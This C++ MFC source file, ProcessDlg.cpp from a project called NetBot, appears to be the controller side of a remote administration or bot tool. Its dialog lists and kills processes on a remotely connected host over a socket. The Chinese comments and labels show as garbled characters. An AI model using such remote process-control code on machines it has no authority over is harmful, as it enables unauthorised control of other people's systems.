// ProcessDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "ProcessDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CProcessDlg dialog


CProcessDlg::CProcessDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CProcessDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CProcessDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_ConnSocket = INVALID_SOCKET;
	m_hWorkThread = NULL;
}


void CProcessDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CProcessDlg)
	DDX_Control(pDX, IDC_PROCESS_LIST, m_ProcessList);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CProcessDlg, CDialog)
	//{{AFX_MSG_MAP(CProcessDlg)
	ON_BN_CLICKED(IDC_GETPROCESS_BTN, OnGetprocessBtn)
	ON_BN_CLICKED(IDC_KILLPROCESS_BTN, OnKillprocessBtn)
	ON_NOTIFY(NM_CLICK, IDC_PROCESS_LIST, OnClickProcessList)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CProcessDlg message handlers
void CProcessDlg::SetConnSocket(SOCKET socket)
{
	m_ConnSocket = socket;

	sockaddr_in addr;
	int cb = sizeof(addr);
	getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
	CString OnlineIP;
	OnlineIP.Format("%s:%d", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));//ntohs������u_longתint

	SetWindowText("[���̲�ѯ] " + OnlineIP);

	OnGetprocessBtn();
}

void CProcessDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CProcessDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_PROCESS), FALSE);
	CenterWindow();
	// TODO: Add extra initialization here
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM, CRect(0, 0, 0, 0), this, 0x1200001);
	int strPartDim[2] = { 400,-1 };
	m_wndStatusBar.SetParts(2, strPartDim);

	ListView_SetExtendedListViewStyle(m_ProcessList.m_hWnd, LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
	m_ProcessList.InsertColumn(0, "��������", LVCFMT_LEFT, 200);
	m_ProcessList.InsertColumn(1, "����ID", LVCFMT_LEFT, 60);
	m_ProcessList.InsertColumn(2, "�߳�����", LVCFMT_LEFT, 70);
	m_ProcessList.InsertColumn(3, "�������ȼ�", LVCFMT_LEFT, 90);
	m_ProcessList.InsertColumn(4, "����·��", LVCFMT_LEFT, 800);
	return TRUE;
}

void CProcessDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	CDialog::PostNcDestroy();
	delete this;
}

BOOL CProcessDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (nVirtKey == VK_RETURN)
		{
			//����ǻس�����������Ҫ��������,����ʲôҲ����
			return TRUE;
		}
		if (nVirtKey == VK_ESCAPE)
		{
			//�����ESC����������Ҫ��������,����ʲôҲ����
			return TRUE;
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}

void CProcessDlg::OnCancel()
{
	StopWork();

	//��ģʽ�Ի�����Ҫ�������ٶԻ���
	DestroyWindow();
	//CDialog::OnCancel();
}

void CProcessDlg::OnClickProcessList(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	POSITION pos = m_ProcessList.GetFirstSelectedItemPosition();
	int iCurrSel = m_ProcessList.GetNextSelectedItem(pos);
	if (iCurrSel >= 0)
	{
		DWORD dwSelPid = m_ProcessList.GetItemData(iCurrSel);

		CString process;
		process = m_ProcessList.GetItemText(iCurrSel, 0);

		StatusTextOut(0, "��������:%s ID:%d", process, dwSelPid);
	}

	*pResult = 0;
}

void CProcessDlg::OnGetprocessBtn()
{
	// TODO: Add your control notification handler code here
	if (m_hWorkThread != NULL)
		return;

	//�����߳�
	m_hWorkThread = ThreadTemplate::StartThread<CProcessDlg, DWORD >(this, &CProcessDlg::ListProcess);
	if (m_hWorkThread == NULL)
		StatusTextOut(0, "��ȡԶ�̽���ʧ��");
}

void CProcessDlg::OnKillprocessBtn()
{
	// TODO: Add your control notification handler code here
	if (m_hWorkThread != NULL)
		return;

	if (m_ProcessList.GetSelectedCount() < 1)
		StatusTextOut(0, "��ѡ��Ҫ�رյĽ���");

	//�����߳�
	m_hWorkThread = ThreadTemplate::StartThread<CProcessDlg, DWORD >(this, &CProcessDlg::KillProcess);
	if (m_hWorkThread == NULL)
		StatusTextOut(0, "�رս���ʧ��");
}

void CProcessDlg::StopWork()
{
	//�ر�socket
	shutdown(m_ConnSocket, 0x02);
	closesocket(m_ConnSocket);

	//����н����̣߳����������߳�
	DWORD dwExitCode;
	if (m_hWorkThread != NULL)
	{
		WaitForSingleObject(m_hWorkThread, 100);
		if (GetExitCodeThread(m_hWorkThread, &dwExitCode))
		{
			if (dwExitCode == STILL_ACTIVE)
				TerminateThread(m_hWorkThread, dwExitCode);
		}
		m_hWorkThread = NULL;
	}
}

void CProcessDlg::OnWorkBegin()
{
	GetDlgItem(IDC_GETPROCESS_BTN)->EnableWindow(FALSE);
	GetDlgItem(IDC_KILLPROCESS_BTN)->EnableWindow(FALSE);
}

void CProcessDlg::OnWorkEnd()
{
	GetDlgItem(IDC_GETPROCESS_BTN)->EnableWindow(TRUE);
	GetDlgItem(IDC_KILLPROCESS_BTN)->EnableWindow(TRUE);

	CloseHandle(m_hWorkThread);
	m_hWorkThread = NULL;
}

DWORD CProcessDlg::ListProcess()
{
	OnWorkBegin();

	m_MsgHead.dwCmd = CMD_PROCESSLIST;
	m_MsgHead.dwSize = 0;

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != 0)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "��ȡԶ�̽���ʧ��");
		OnWorkEnd();
		return 0;
	}

	//��ʾ��ȡ�Ľ���
	m_ProcessList.DeleteAllItems();
	DWORD dwNum = m_MsgHead.dwSize / sizeof(ProcessInfo);
	BYTE * m_DesBuf = (LPBYTE)m_Buffer;
	LPProcessInfo pInfo = (LPProcessInfo)m_DesBuf;
	for (DWORD i = 0; i < dwNum; i++)
	{
		//��ö�ٳ���ģ�IDΪ0�Ľ��й���
		if (pInfo[i].dwPid == 0x0)
		{
			if (i == 0)
				lstrcpy(pInfo[i].FilePath, "");
			else
				continue;
		}

		//��ӽ���
		CString temp;
		m_ProcessList.InsertItem(i, "");
		m_ProcessList.SetItemData(i, pInfo[i].dwPid);
		m_ProcessList.SetItemText(i, 0, pInfo[i].FileName);
		temp.Format("%d", pInfo[i].dwPid);
		m_ProcessList.SetItemText(i, 1, temp);
		temp.Format("%d", pInfo[i].dwThreads);
		m_ProcessList.SetItemText(i, 2, temp);
		m_ProcessList.SetItemText(i, 3, __MakePriority(pInfo[i].dwPriClass));
		m_ProcessList.SetItemText(i, 4, pInfo[i].FilePath);
	}

	StatusTextOut(1, _T("����: %d"), m_ProcessList.GetItemCount());

	StatusTextOut(0, "");
	OnWorkEnd();
	return 0;
}

DWORD CProcessDlg::KillProcess()
{
	OnWorkBegin();

	int nItem = m_ProcessList.GetNextItem(-1, LVNI_SELECTED);
	DWORD dwPid = m_ProcessList.GetItemData(nItem);

	m_MsgHead.dwCmd = CMD_PROCESSKILL;
	m_MsgHead.dwSize = 0;
	m_MsgHead.dwExtend1 = dwPid;

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != 0)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "�رս���ʧ��");
		OnWorkEnd();
		return 0;
	}

	//�رս���
	m_ProcessList.DeleteItem(nItem);

	StatusTextOut(1, _T("����: %d"), m_ProcessList.GetItemCount());

	StatusTextOut(0, "");
	OnWorkEnd();
	return 0;
}

CString CProcessDlg::__MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch (dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = "ʵʱ";
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = "��";
		break;
	case 0x00008000:	//ABOVE_NORMAL_PRIORITY_CLASS
		strRet = "���ڱ�׼";
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = "��׼";
		break;
	case 0x00004000:	//BELOW_NORMAL_PRIORITY_CLASS
		strRet = "���ڱ�׼";
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = "����";
		break;
	default:
		strRet = "δ֪";
		break;
	}

	return strRet;
}